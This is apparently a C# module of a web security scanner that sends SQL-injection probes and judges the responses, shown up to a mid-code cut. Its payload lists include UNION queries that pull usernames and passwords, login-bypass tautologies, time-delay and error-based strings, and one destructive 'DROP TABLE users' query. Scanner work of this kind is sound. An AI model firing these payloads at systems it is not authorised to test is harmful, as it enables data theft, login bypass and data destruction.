using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Web;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Active security probes using browser-context fetch (session cookies, CORS). Keep payloads and request counts small by default.
/// </summary>
public static class HttpSecurityProbes
{
    private static readonly string[] DefaultSqliPayloads =
    [
        // UNION numeric
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT 1,2,3--",
        "-1 UNION SELECT username,password,3 FROM users--",
        // UNION string
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "\" UNION SELECT NULL,NULL--",
        // Boolean blind
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1--",
        "1 AND 1=2--",
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "admin' #",
        // Time-based (also available via includeTimeBased for longer delays)
        "1' AND SLEEP(2)--",
        "1' AND (SELECT SLEEP(2))--",
        "1; SELECT pg_sleep(2)--",
        "1' AND pg_sleep(2)--",
        "1'; WAITFOR DELAY '0:0:2'--",
        "1) WAITFOR DELAY '0:0:2'--",
        // Error-based
        "1' AND extractvalue(1,concat(0x7e,version()))--",
        "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        // Stacked / comment variants
        "1; DROP TABLE users--",
        "1'-- ",
        "1'#",
        "1'/**/OR/**/'1'='1",
        "1'/**/UNION/**/SELECT/**/NULL--",
        // Legacy tautology set (auth bypass)
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR '1'='1'--",
        "1' OR '1'='1",
        "\" OR \"\"=\"",
    ];

    /// <summary>Fast SQLi screening set — extended payloads run only when these show a signal.</summary>
    public static readonly string[] ScreeningSqliPayloads =
    [
        "' OR 1=1--",
        "1' AND '1'='2",
        "1 AND 1=1--",
        "1 AND 1=2--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' AND extractvalue(1,concat(0x7e,version()))--",
        "admin'--"
    ];

    /// <summary>Sequential UNION leak markers (Juice Shop / search API pattern).</summary>
    private static readonly string[] UnionLeakMarkers =
    [
        "\"name\":\"2\"",
        "\"name\":\"1\"",
        "\"description\":\"3\"",
        "\"description\":\"2\"",
        "\"price\":4",
        "\"price\":3",
        "\"image\":6",
        "\"image\":5",
        "\"1\",\"2\",\"3\"",
        "\"1\",\"2\",\"3\",\"4\""
    ];

    private static readonly string[] TimeBasedPayloads =
    [
        "' AND SLEEP(2)--",
        "'; WAITFOR DELAY '0:0:2'--",
        "' AND pg_sleep(2)--",
    ];

    /// <summary>Optional add-on payloads for ORM/string-concat search queries (e.g. closing a quoted fragment + comment).</summary>
    private static readonly string[] OrmClosureSqliPayloads =
    [
        "'))--",
        "\")--",
        "%'))--",
        "%\")--",
        "')) OR '1'='1'--",
    ];

    public sealed class SqliScanResult
    {
        public string BaselineUrl { get; init; } = "";
        public int BaselineStatus { get; init; }
        public int BaselineLength { get; init; }
        public long BaselineMs { get; init; }
        public List<SqliScanRow> Rows { get; init; } = [];
        public List<string> Summary { get; init; } = [];
        /// <summary>Promoted detections from <see cref="Rows"/> for LLM consumers (unified contract).</summary>
        public List<UnifiedSecurityFinding> Findings { get; init; } = [];
        /// <summary>
        /// Bounded baseline body text for stripped-hash comparisons (auto-scan evidence bundle).
        /// </summary>
        public string BaselineEvidenceSample { get; init; } = "";

        /// <summary>Canonical hash of baseline body after <see cref="ResponseBodySecurityHeuristics.StripFrameworkNoiseForSecurityEvidence"/>.</summary>
        public string BaselineStrippedHash { get; init; } = "";

        /// <summary>True when probes used <see cref="HttpClient"/> instead of in-page fetch (bypasses Zone.js in Angular SPAs).</summary>
        public bool UseBackendFetch { get; init; }
        /// <summary>When <see cref="UseBackendFetch"/> is true, cookies from the WebView were merged into the Cookie header.</summary>
        public bool IncludedBrowserCookies { get; init; }

        public string Depth { get; init; } = SecurityScanDepth.Standard;

        public bool HasFindings => Findings.Count > 0;

        /// <summary>Wall-clock duration of the scan (baseline + all payloads).</summary>
        public int ElapsedMs { get; init; }

        public SecurityScanResult ToSecurityScanResult() => new()
        {
            Message = HasFindings
                ? $"{Findings.Count} SQLi finding(s)."
                : "No SQLi indicators.",
            Depth = Depth,
            CandidatesProbed = 1,
            PayloadsSent = Rows.Count,
            ElapsedMs = ElapsedMs,
            Findings = Findings,
            Summary = Summary,
            Details = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
            {
                ["baseline"] = new
                {
                    status = BaselineStatus,
                    length = BaselineLength,
                    ms = BaselineMs,
                    url = BaselineUrl
                },
                ["useBackendFetch"] = UseBackendFetch,
                ["includedBrowserCookies"] = IncludedBrowserCookies,
                ["findingGroups"] = BuildSqliFindingGroups(
                    Findings.Where(f => SecurityConfidence.MeetsMinimum(f.Confidence, SecurityConfidence.Likely)).ToList()),
                ["rows"] = Rows.Select(r => new
                {
                    r.Payload,
                    r.Url,
                    r.Status,
                    r.BodyLength,
                    r.DurationMs,
                    r.LengthDeltaExplainedByReflection,
                    r.DataRowCount,
                    r.DataRowCountDiverged,
                    types = r.Types,
                    sqlHits = r.SqlHits.Select(h => new { h.Engine, h.Pattern, h.Snippet }),
                    bodySnippet = r.Body
                }).ToList()
            }
        };
    }

    public sealed class SqliScanRow
    {
        public string Payload { get; init; } = "";
        public string Url { get; init; } = "";
        public string? Body { get; init; }
        public int Status { get; init; }
        public int BodyLength { get; init; }
        public long DurationMs { get; init; }
        public List<string> Types { get; init; } = [];
        public List<ResponseBodySecurityHeuristics.SqlSignatureHit> SqlHits { get; init; } = [];

        /// <summary><see cref="ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash"/> for this probe response (noise-stripped).</summary>
        public string ProbeStrippedHash { get; init; } = "";

        /// <summary>Samples used with baseline for unified diff excerpts in auto-scan findings.</summary>
        public string ProbeEvidenceSample { get; init; } = "";

        /// <summary>
        /// True when the body-length gap versus baseline is accounted for by the payload
        /// being echoed (verbatim or encoded). Length alone is then not a SQLi oracle.
        /// </summary>
        public bool LengthDeltaExplainedByReflection { get; init; }

        /// <summary>HTML data-row or JSON array count when the body exposes one; otherwise null.</summary>
        public int? DataRowCount { get; init; }

        /// <summary>True when <see cref="DataRowCount"/> and the baseline count both exist and differ.</summary>
        public bool DataRowCountDiverged { get; init; }
    }

    public static async Task<SqliScanResult> RunSqliScanAsync(
        AutomationContext ctx,
        string urlTemplate,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        string baselineMarkerValue,
        IReadOnlyList<string>? customPayloads,
        bool includeTimeBased,
        int timeoutMs,
        int maxBodyChars,
        bool useBackendFetch = false,
        bool includeBrowserCookies = false,
        bool includeOrmClosurePayloads = false,
        CancellationToken ct = default,
        string? depth = null,
        PayloadProfile payloadProfile = PayloadProfile.Small)
    {
        method = string.IsNullOrWhiteSpace(method) ? "GET" : method.Trim().ToUpperInvariant();
        var markers = RequestMarkerSubstitute.ListMarkers(urlTemplate, bodyTemplate, headers);
        if (markers.Count == 0)
            throw new ArgumentException(InjectionRequestErrors.WithRequestExample(
                "Template must contain at least one §marker§ or {{marker}} injection point in url, body, or headers (same as /api/fuzz)."));

        var scanSw = Stopwatch.StartNew();
        var depthProfile = InjectionScanDepth.Resolve(depth);
        var timeBased = includeTimeBased || (customPayloads == null && depthProfile.IncludeTimeBasedDefault);
        var ormClosure = includeOrmClosurePayloads || depthProfile.IncludeOrmClosure;

        List<string> payloads;
        if (customPayloads is { Count: > 0 })
        {
            payloads = customPayloads.ToList();
        }
        else if (depthProfile.UseScreeningOnly)
        {
            payloads = ScreeningSqliPayloads.ToList();
        }
        else
        {
            payloads = PayloadCatalog.ResolveWithFallback("sqli-basic", DefaultSqliPayloads, payloadProfile).ToList();
            if (depthProfile.IncludeUnionColumnLadder)
                payloads.AddRange(BuildUnionColumnLadderPayloads(depthProfile.UnionColumnMax));
        }

        if (timeBased)
            payloads.AddRange(TimeBasedPayloads);
        if (ormClosure)
            payloads.AddRange(OrmClosureSqliPayloads);
        payloads = payloads.Distinct(StringComparer.Ordinal).ToList();

        var loginLikePost = SqliBodySuggestsLoginForm(bodyTemplate, headers)
            && string.Equals(method, "POST", StringComparison.OrdinalIgnoreCase);
        var backendFollowRedirects = !(useBackendFetch && loginLikePost);
        var mutatingMethod = method is "POST" or "PUT" or "PATCH";
        var urlHasCsrfQueryToken = UrlTemplateHasCsrfQueryToken(urlTemplate);

        async Task<(string Body, Dictionary<string, string>? Headers, bool CsrfApplied, string Url)> PrepareWithCsrfAsync(
            string markerValue)
        {
            var fetchUrl = RequestMarkerSubstitute.ReplaceAllInUrl(urlTemplate, markerValue);
            var body = SubstituteSqliBody(bodyTemplate, markerValue, headers);
            var hdrs = RequestMarkerSubstitute.ReplaceAllInHeaders(headers, markerValue)
                       ?? new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            // GET forms often embed one-time CSRF tokens in the query (e.g. user_token). Reusing a
            // single token across baseline + probes makes every probe look like a boolean differential.
            if (!mutatingMethod)
            {
                if (urlHasCsrfQueryToken)
                {
                    fetchUrl = await RefreshGetCsrfQueryTokensAsync(ctx, fetchUrl, ct);
                    return (body ?? "", hdrs.Count > 0 ? hdrs : null, true, fetchUrl);
                }

                return (body ?? "", hdrs.Count > 0 ? hdrs : null, false, fetchUrl);
            }

            var domPrepared = await InsecureDesignProbeSupport.PrepareRequestAsync(
                ctx, body, hdrs, fetchUrl, injectCsrfIfMissing: true, ct);
            body = domPrepared.Body ?? body;
            hdrs = domPrepared.Headers;
            var csrfApplied = domPrepared.CsrfRefreshed;

            if (loginLikePost && !domPrepared.CsrfRefreshed)
            {
                var loginPrepared = await LoginCsrfHelper.PrepareAsync(
                    ctx, fetchUrl, method, hdrs, body ?? "", timeoutMs, ct);
                body = loginPrepared.Body;
                hdrs = loginPrepared.Headers;
                csrfApplied = loginPrepared.CsrfApplied;
            }

            return (body ?? "", hdrs, csrfApplied, fetchUrl);
        }

        async Task<string> DoFetchAsync(string fetchUrl, string m, Dictionary<string, string>? hdrs, string? b)
        {
            // Never attach a body on GET/HEAD (empty string still breaks browser fetch).
            if (m.Equals("GET", StringComparison.OrdinalIgnoreCase)
                || m.Equals("HEAD", StringComparison.OrdinalIgnoreCase))
                b = null;

            if (!useBackendFetch)
                return await ctx.Fetch(fetchUrl, m, hdrs, b, timeoutMs);
            Dictionary<string, string>? merged = hdrs is { Count: > 0 }
                ? new Dictionary<string, string>(hdrs, StringComparer.OrdinalIgnoreCase)
                : null;
            if (includeBrowserCookies)
            {
                var ck = await ctx.GetCookieHeaderForUrl(fetchUrl);
                if (!string.IsNullOrEmpty(ck))
                {
                    merged ??= new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                    if (merged.TryGetValue("Cookie", out var existing) && !string.IsNullOrEmpty(existing))
                        merged["Cookie"] = existing + "; " + ck;
                    else
                        merged["Cookie"] = ck;
                }
            }

            return await ServerSideHttpAsFetchJsonAsync(
                ctx, fetchUrl, m, merged, b, bodyTemplate, timeoutMs, backendFollowRedirects, ct);
        }

        var rows = new List<SqliScanRow>();
        var swBase = Stopwatch.StartNew();
        var (baseBody, baseHeaders, csrfApplied, baseUrl) = await PrepareWithCsrfAsync(baselineMarkerValue);
        var baseJson = await DoFetchAsync(baseUrl, method, baseHeaders, baseBody);
        swBase.Stop();
        ct.ThrowIfCancellationRequested();
        var baseParsed = ParseFetchJsonFull(baseJson);
        var bStatus = baseParsed.Status;
        var bText = baseParsed.Body;
        var baselineLocation = baseParsed.Location;
        var baselineMs = swBase.ElapsedMilliseconds;
        var baselineCsrfRejected = InsecureDesignProbeSupport.LooksLikeCsrfRejection(bStatus, bText);
        var refreshCsrfPerProbe =
            urlHasCsrfQueryToken
            || (mutatingMethod && (csrfApplied || loginLikePost || baselineCsrfRejected));
        const int evidenceSampleClamp = 4096;
        var baselineEvidenceClamp = bText.Length <= evidenceSampleClamp
            ? bText
            : bText[..evidenceSampleClamp];
        var baselineStrippedHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(bText);
        var baselineDataRows = TryCountResponseDataRows(bText);

        foreach (var payload in payloads)
        {
            ct.ThrowIfCancellationRequested();
            string subUrl;
            string subBody;
            Dictionary<string, string>? probeHeaders;
            if (refreshCsrfPerProbe)
            {
                (subBody, probeHeaders, _, subUrl) = await PrepareWithCsrfAsync(payload);
            }
            else
            {
                subUrl = RequestMarkerSubstitute.ReplaceAllInUrl(urlTemplate, payload);
                subBody = SubstituteSqliBody(bodyTemplate, payload, headers) ?? "";
                probeHeaders = RequestMarkerSubstitute.ReplaceAllInHeaders(headers, payload) ?? headers;
            }

            var sw = Stopwatch.StartNew();
            var json = await DoFetchAsync(subUrl, method, probeHeaders, subBody);
            sw.Stop();
            var probeParsed = ParseFetchJsonFull(json);
            var status = probeParsed.Status;
            var text = probeParsed.Body;
            var probeLocation = probeParsed.Location;
            var bodySample = text.Length > maxBodyChars ? text[..maxBodyChars] : text;
            var sqlHits = ResponseBodySecurityHeuristics.DetectSqlErrorSignatures(bodySample);
            var probeDataRows = TryCountResponseDataRows(text);
            var dataRowCountDiverged = baselineDataRows is int baseRows
                                       && probeDataRows is int gotRows
                                       && baseRows != gotRows;
            // Full body, not the truncated sample: sort links and form actions often sit past the snippet.
            var reflectionExplains = PayloadReflectionExplainsLengthDelta(
                bText, text, payload, baselineMarkerValue);
            var types = new List<string>();
            if (sqlHits.Count > 0) types.Add("error-based");

            var hasUnionToken = bodySample.Contains("UNION", StringComparison.OrdinalIgnoreCase)
                                && SqliPayloadImplementsUnionInjection(payload);

            var unionProbablyEcho = SqliUnionKeywordLikelyReflectionOnly(bodySample, bText, payload, sqlHits);
            if (hasUnionToken && !unionProbablyEcho)
            {
                if (sqlHits.Count > 0)
                    types.Add("union-based");
                else if (SqliColumnMentionLooksLikeDatabaseError(bodySample))
                    types.Add("union-based");
            }

            if (DetectUnionLeakMarkers(bodySample, bText))
                types.Add("union-leak-suspected");

            var probeHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(bodySample);
            var hashDiverged = !string.Equals(probeHash, baselineStrippedHash, StringComparison.Ordinal);
            var lengthDiverged = status != bStatus
                                 || Math.Abs(text.Length - bText.Length) > Math.Max(20, bText.Length / 10);
            var csrfRejectedProbe = InsecureDesignProbeSupport.LooksLikeCsrfRejection(status, text);
            // Small hash-only drifts (e.g. CSRF-fail page vs success) are not boolean oracles.
            var meaningfulBooleanDelta = lengthDiverged
                || (hashDiverged && Math.Abs(text.Length - bText.Length) > Math.Max(40, bText.Length / 40));
            // Echoed payloads change byte length without changing the query result. Require a
            // length gap reflection cannot explain, or a real row-count split, before suspecting boolean SQLi.
            if (meaningfulBooleanDelta
                && !reflectionExplains
                && !csrfRejectedProbe
                && sqlHits.Count == 0 && LooksLikeBooleanSqliPayload(payload))
            {
                if (IsSqliAuthBypassSuspectedHeuristic(
                        method, bodyTemplate, headers, bStatus, status, bText, text, payload,
                        baselineLocation, probeLocation))
                    types.Add("auth-bypass-suspected");
                else
                    types.Add("blind-boolean-suspected");
            }
            if (timeBased && (payload.Contains("SLEEP", StringComparison.OrdinalIgnoreCase)
                || payload.Contains("WAITFOR", StringComparison.OrdinalIgnoreCase)
                || payload.Contains("pg_sleep", StringComparison.OrdinalIgnoreCase)))
            {
                var delayThreshold = Math.Max(baselineMs + 1500, 2500);
                var delayed = sw.ElapsedMilliseconds > delayThreshold;
                if (delayed && depthProfile.TimeSampleCount > 1)
                {
                    var hits = 1;
                    for (var sample = 1; sample < depthProfile.TimeSampleCount; sample++)
                    {
                        ct.ThrowIfCancellationRequested();
                        var sw2 = Stopwatch.StartNew();
                        await DoFetchAsync(subUrl, method, probeHeaders, subBody);
                        sw2.Stop();
                        if (sw2.ElapsedMilliseconds > delayThreshold)
                            hits++;
                    }

                    if (hits >= (depthProfile.TimeSampleCount + 1) / 2)
                        types.Add("time-based-suspected");
                }
                else if (delayed)
                {
                    types.Add("time-based-suspected");
                }
            }

            if (IsSqliLoginTokenEmergenceHeuristic(method, bodyTemplate, bStatus, status, bText, text, payload)
                && !types.Any(t => t.Equals("auth-bypass-suspected", StringComparison.OrdinalIgnoreCase)))
                types.Add("auth-bypass-suspected");

            if (!types.Any(t => t.Equals("auth-bypass-suspected", StringComparison.OrdinalIgnoreCase))
                && IsSqliAuthBypassSuspectedHeuristic(
                    method, bodyTemplate, headers, bStatus, status, bText, text, payload,
                    baselineLocation, probeLocation))
                types.Add("auth-bypass-suspected");

            var probeEvidenceClamp = bodySample.Length <= evidenceSampleClamp
                ? bodySample
                : bodySample[..evidenceSampleClamp];

            rows.Add(new SqliScanRow
            {
                Payload = payload,
                Url = subUrl,
                Body = bodySample.Length > 2000 ? bodySample[..2000] + "…" : bodySample,
                Status = status,
                BodyLength = text.Length,
                DurationMs = sw.ElapsedMilliseconds,
                Types = types.Distinct(StringComparer.OrdinalIgnoreCase).ToList(),
                SqlHits = sqlHits,
                ProbeStrippedHash = probeHash,
                ProbeEvidenceSample = probeEvidenceClamp,
                LengthDeltaExplainedByReflection = reflectionExplains,
                DataRowCount = probeDataRows,
                DataRowCountDiverged = dataRowCountDiverged
            });
        }

        ApplySqliSpaShellFalsePositiveHeuristics(rows, bStatus, bText);
        ApplySqliUnionAndNextJsFlightFalsePositiveHeuristics(rows, bText);
        ApplySqliIdenticalStrippedHashFalsePositiveHeuristics(rows, baselineStrippedHash);
        ApplySqliCsrfContaminationHeuristics(rows, bStatus, bText);
        ApplySqliBooleanDifferentialConfirm(rows, bText.Length, baselineCsrfRejected);
        ApplySqliReflectionExplainedLengthHeuristics(rows);
        ApplySqliInputValidationFalsePositiveHeuristics(rows, bStatus, bText);
        // Content-creating POSTs (reviews/comments) grow by payload echo — not a SQLi oracle.
        if (mutatingMethod)
            ApplySqliMutatingContentCreateFalsePositiveHeuristics(rows, bText, baselineStrippedHash);

        var summary = new List<string>();
        if (useBackendFetch)
        {
            summary.Add(
                "useBackendFetch: probes used .NET HttpClient (not in-page fetch), avoiding Zone.js / fetch monkey-patching in Angular and similar SPAs. " +
                (includeBrowserCookies
                    ? "includeBrowserCookies: merged WebView cookies into the Cookie header for each request URL."
                    : "Browser cookies were not sent unless you pass includeBrowserCookies: true (cookie jar still available for login flows that need the session)."));
        }
        if (rows.Any(r => r.SqlHits.Count > 0))
            summary.Add("SQL error signatures detected — treat as high-priority for manual verification.");
        if (rows.Any(r => r.Types.Contains("auth-bypass-suspected")))
            summary.Add(
                "Login-like POST: possible auth bypass — baseline rejected (401/403), redirect Location diverged from failed login, " +
                "response body shifted from login-failure to authenticated-area markers, or JSON baseline lacked a session token " +
                "while a tautology payload response includes one (heuristic).");
        if (useBackendFetch && loginLikePost && !backendFollowRedirects)
            summary.Add(
                "loginLikePost: useBackendFetch disabled auto-redirect so 302 Location headers are preserved for form-login auth-bypass heuristics.");
        if (rows.Any(r => r.Types.Contains("union-leak-suspected")))
            summary.Add("Response contains sequential UNION leak markers (e.g. \"name\":\"2\") absent from baseline — possible UNION-based SQLi.");
        if (rows.Any(r => r.Types.Contains("blind-boolean-confirmed")))
            summary.Add("Truthy/falsy boolean payload pair produced different noise-stripped response hashes — confirmed blind boolean SQLi signal.");
        else if (rows.Any(r => r.Types.Contains("blind-boolean-suspected")))
            summary.Add("Response diverges from baseline on tautology payloads — possible blind SQLi (heuristic).");
        if (rows.Any(r => r.Types.Contains("time-based-suspected")))
            summary.Add("Delayed responses on time-based payloads — possible blind SQLi (heuristic).");
        if (rows.Any(r => r.Types.Contains("union-column-match")))
            summary.Add("UNION column-count ladder matched (different NULL arity responses) — possible UNION-based SQLi.");

        var csrfRejectedCount = rows.Count(r =>
            InsecureDesignProbeSupport.LooksLikeCsrfRejection(r.Status, r.Body));
        if (csrfRejectedCount > 0)
        {
            if (csrfRejectedCount == rows.Count)
            {
                summary.Insert(0,
                    "All payloads rejected by CSRF validation — navigate to the form page that submits to this endpoint, " +
                    "then retry. Tokens are auto-extracted from the live DOM (or fetched from the login page for login-like POSTs). " +
                    "For CSRF-heavy forms, browser form submission via trace-input may be more reliable.");
            }
            else if (csrfRejectedCount >= rows.Count * 0.8)
            {
                summary.Add(
                    $"Most payloads ({csrfRejectedCount}/{rows.Count}) rejected by CSRF — SQLi results inconclusive. " +
                    "Ensure the target form page is loaded; per-probe CSRF refresh is enabled for this scan.");
            }
        }
        else if (mutatingMethod && !csrfApplied && !loginLikePost)
        {
            summary.Add(
                "No CSRF token was found on the current page for this POST — if the endpoint requires CSRF, " +
                "navigate to its form first or include the token in the request template.");
        }

        scanSw.Stop();
        return new SqliScanResult
        {
            BaselineUrl = baseUrl,
            BaselineStatus = bStatus,
            BaselineLength = bText.Length,
            BaselineMs = baselineMs,
            BaselineEvidenceSample = baselineEvidenceClamp,
            BaselineStrippedHash = baselineStrippedHash,
            Rows = rows,
            Summary = summary,
            Findings = BuildSqliFindings(rows, urlTemplate, markers, method, baselineEvidenceClamp),
            UseBackendFetch = useBackendFetch,
            IncludedBrowserCookies = useBackendFetch && includeBrowserCookies,
            Depth = depthProfile.Name,
            ElapsedMs = (int)scanSw.ElapsedMilliseconds
        };
    }

    internal static List<string> BuildUnionColumnLadderPayloads(int maxColumns)
    {
        var list = new List<string>();
        var n = Math.Clamp(maxColumns, 2, 12);
        for (var cols = 1; cols <= n; cols++)
        {
            var nulls = string.Join(",", Enumerable.Repeat("NULL", cols));
            list.Add($"1 UNION SELECT {nulls}--");
            list.Add($"' UNION SELECT {nulls}--");
        }

        return list;
    }

    /// <summary>
    /// When a configured truthy/falsy pair has different noise-stripped hashes <em>after neutralizing
    /// reflected payload text</em>, promote to confirmed blind boolean. Rejects MySQL coercion /
    /// echo-only pairs that differ solely because the payload string appears in the HTML form value.
    /// Also fails closed when both sides look like CSRF rejection or when neither side resembles
    /// a successful baseline (token-reuse / fail-page differentials).
    /// </summary>
    private static void ApplySqliBooleanDifferentialConfirm(
        List<SqliScanRow> rows,
        int baselineLength,
        bool baselineCsrfRejected)
    {
        if (rows.Count < 2) return;
        // Never confirm boolean SQLi when the baseline itself was CSRF-rejected — there is no
        // trustworthy content oracle for true vs false query results.
        if (baselineCsrfRejected) return;

        var byNormalized = new Dictionary<string, SqliScanRow>(StringComparer.OrdinalIgnoreCase);
        foreach (var r in rows)
            byNormalized.TryAdd(NormalizeSqliPayloadKey(r.Payload), r);

        foreach (var (truthy, falsy) in SqliBooleanPairs)
        {
            var tKey = NormalizeSqliPayloadKey(truthy);
            var fKey = NormalizeSqliPayloadKey(falsy);
            if (!byNormalized.TryGetValue(tKey, out var tRow) || !byNormalized.TryGetValue(fKey, out var fRow))
                continue;

            if (InsecureDesignProbeSupport.LooksLikeCsrfRejection(tRow.Status, tRow.Body)
                || InsecureDesignProbeSupport.LooksLikeCsrfRejection(fRow.Status, fRow.Body))
                continue;

            // Primary oracle: 1=1 vs 1=2 changed the result-set size, and equal-length
            // non-boolean probes did not. Byte length is secondary.
            if (BooleanPairRowCountsCorroborate(tRow, fRow, rows))
            {
                PromoteBooleanConfirmed(tRow, fRow);
                continue;
            }

            var pairRowsDiffer = tRow.DataRowCount is int truthyRows
                                 && fRow.DataRowCount is int falsyRows
                                 && truthyRows != falsyRows;
            if (tRow.LengthDeltaExplainedByReflection
                && fRow.LengthDeltaExplainedByReflection
                && !pairRowsDiffer)
            {
                StripSqliHeuristicTypes(tRow, "blind-boolean-suspected");
                StripSqliHeuristicTypes(fRow, "blind-boolean-suspected");
                StripSqliHeuristicTypes(tRow, "blind-boolean-confirmed");
                StripSqliHeuristicTypes(fRow, "blind-boolean-confirmed");
                continue;
            }

            // Content oracle: require asymmetric distance from the successful baseline.
            // Shared CSRF-fail pages are often only tens of bytes off the success page and
            // nearly identical to each other — those must not confirm.
            var tDist = Math.Abs(tRow.BodyLength - baselineLength);
            var fDist = Math.Abs(fRow.BodyLength - baselineLength);
            var closer = Math.Min(tDist, fDist);
            var farther = Math.Max(tDist, fDist);
            var nearThreshold = Math.Max(24, baselineLength / 80);   // ~1.25%
            var minGap = Math.Max(40, baselineLength / 40);          // clear true/false split
            var asymmetricOracle = closer <= nearThreshold && (farther - closer) >= minGap;

            // Identical (or near-identical) lengths on both sides of a boolean pair cannot be a
            // content oracle even if neutralized hashes drift due to residual echo/noise.
            if (Math.Abs(tRow.BodyLength - fRow.BodyLength) < 8 && tRow.Status == fRow.Status)
                continue;

            if (tRow.Status != fRow.Status)
            {
                if (!asymmetricOracle) continue;
                PromoteBooleanConfirmed(tRow, fRow);
                continue;
            }

            // Neutralize payload echo in both bodies before comparing — otherwise
            // `1 AND 1=1--` vs `1 AND 1=2--` always "differ" when the form reflects the value.
            var tNeutral = NeutralizePayloadReflection(tRow.ProbeEvidenceSample, tRow.Payload);
            var fNeutral = NeutralizePayloadReflection(fRow.ProbeEvidenceSample, fRow.Payload);
            var tHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(tNeutral);
            var fHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(fNeutral);
            if (string.Equals(tHash, fHash, StringComparison.Ordinal))
                continue;

            // Require an asymmetric length signal after neutralization (not just token noise).
            var lenDelta = Math.Abs(tNeutral.Length - fNeutral.Length);
            if (lenDelta < 8
                && string.Equals(
                    ResponseBodySecurityHeuristics.StripFrameworkNoiseForSecurityEvidence(tNeutral),
                    ResponseBodySecurityHeuristics.StripFrameworkNoiseForSecurityEvidence(fNeutral),
                    StringComparison.Ordinal))
                continue;

            if (!asymmetricOracle)
                continue;

            PromoteBooleanConfirmed(tRow, fRow);
        }

        // UNION column ladder: consecutive NULL-arity payloads with diverging hashes → column match signal
        var unionRows = rows
            .Where(r => SqliPayloadImplementsUnionInjection(r.Payload) && r.Payload.Contains("NULL", StringComparison.OrdinalIgnoreCase))
            .ToList();
        for (var i = 0; i + 1 < unionRows.Count; i++)
        {
            var a = unionRows[i];
            var b = unionRows[i + 1];
            if (UnionPairIsReflectionArtifact(a, b))
                continue;
            if (string.Equals(a.ProbeStrippedHash, b.ProbeStrippedHash, StringComparison.Ordinal))
                continue;
            if (a.SqlHits.Count == 0 && b.SqlHits.Count == 0
                && a.Status == b.Status
                && Math.Abs(a.BodyLength - b.BodyLength) < 40)
                continue;

            foreach (var r in new[] { a, b })
            {
                if (!r.Types.Contains("union-column-match"))
                    r.Types.Add("union-column-match");
                if (!r.Types.Contains("union-based"))
                    r.Types.Add("union-based");
            }
        }
    }

    private static void PromoteBooleanConfirmed(SqliScanRow tRow, SqliScanRow fRow)
    {
        foreach (var r in new[] { tRow, fRow })
        {
            if (!r.Types.Contains("blind-boolean-suspected")
                && !r.Types.Contains("auth-bypass-suspected"))
                r.Types.Add("blind-boolean-suspected");
            if (!r.Types.Contains("blind-boolean-confirmed"))
                r.Types.Add("blind-boolean-confirmed");
        }
    }

    /// <summary>Replace occurrences of the injected payload so echo-only differentials collapse.</summary>
    internal static string NeutralizePayloadReflection(string? body, string payload)
    {
        if (string.IsNullOrEmpty(body) || string.IsNullOrEmpty(payload))
            return body ?? "";
        var neutralized = body.Replace(payload, "§P§", StringComparison.OrdinalIgnoreCase);
        var encoded = Uri.EscapeDataString(payload);
        if (!string.IsNullOrEmpty(encoded) && encoded != payload)
            neutralized = neutralized.Replace(encoded, "§P§", StringComparison.OrdinalIgnoreCase);
        var htmlEncoded = System.Net.WebUtility.HtmlEncode(payload);
        if (!string.IsNullOrEmpty(htmlEncoded) && htmlEncoded != payload)
            neutralized = neutralized.Replace(htmlEncoded, "§P§", StringComparison.OrdinalIgnoreCase);
        return neutralized;
    }

    internal static List<UnifiedSecurityFinding> BuildSqliFindings(
        IReadOnlyList<SqliScanRow> rows,
        string urlTemplate,
        IReadOnlyList<string> markers,
        string method = "GET",
        string? baselineEvidenceSample = null)
    {
        // Collapse by (endpoint path, param, class) — one finding per bug with payloads[] evidence.
        // Agents previously saw one HIGH per payload (finding explosion).
        var groups = new Dictionary<string, SqliFindingAccumulator>(StringComparer.OrdinalIgnoreCase);
        var order = new List<string>();
        var param = markers.Count > 0 ? markers[0] : "";
        var endpointKey = NormalizeSqliFindingEndpoint(urlTemplate);

        foreach (var row in rows)
        {
            if (row.Types.Count == 0 && row.SqlHits.Count == 0) continue;

            var hasError = row.SqlHits.Count > 0 || row.Types.Contains("error-based", StringComparer.OrdinalIgnoreCase);
            var hasAuth = row.Types.Contains("auth-bypass-suspected", StringComparer.OrdinalIgnoreCase);
            var hasTime = row.Types.Contains("time-based-suspected", StringComparer.OrdinalIgnoreCase);
            // Reflected payload text explains the byte delta and the result set did not change.
            var lengthOnlyReflection = row.LengthDeltaExplainedByReflection
                                       && row.SqlHits.Count == 0
                                       && !row.DataRowCountDiverged
                                       && !row.Types.Contains("union-leak-suspected", StringComparer.OrdinalIgnoreCase);
            var hasUnion = !lengthOnlyReflection
                           && row.Types.Any(t => t.Contains("union", StringComparison.OrdinalIgnoreCase));
            var hasBoolConfirmed = row.Types.Contains("blind-boolean-confirmed", StringComparer.OrdinalIgnoreCase);
            var hasBool = !lengthOnlyReflection
                          && row.Types.Contains("blind-boolean-suspected", StringComparer.OrdinalIgnoreCase);
            if (!hasError && !hasAuth && !hasTime && !hasUnion && !hasBool && !hasBoolConfirmed)
                continue;

            var findingClass = hasAuth
                ? "auth-bypass"
                : hasError
                    ? "error-based"
                    : hasBoolConfirmed
                        ? "blind-boolean-confirmed"
                        : hasUnion
                            ? "union-based"
                            : hasTime
                                ? "time-based"
